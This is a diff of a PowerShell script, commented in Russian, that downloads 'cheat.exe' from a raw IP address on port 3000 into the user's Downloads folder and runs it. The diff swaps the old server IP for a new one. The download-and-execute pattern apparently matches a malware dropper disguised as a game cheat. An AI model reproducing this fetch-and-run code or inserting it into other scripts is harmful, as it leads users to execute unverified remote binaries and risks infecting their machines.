@@ -1,5 +1,5 @@
 # Скачивание и запуск cheat.exe
-$uri3 = "http://5.129.229.175:3000/cheat.exe"
+$uri3 = "http://62.60.179.61:3000/cheat.exe"
 $out3 = "$env:USERPROFILE\Downloads\cheat.exe"
 Invoke-WebRequest -Uri $uri3 -OutFile $out3
 Start-Process -FilePath $out3
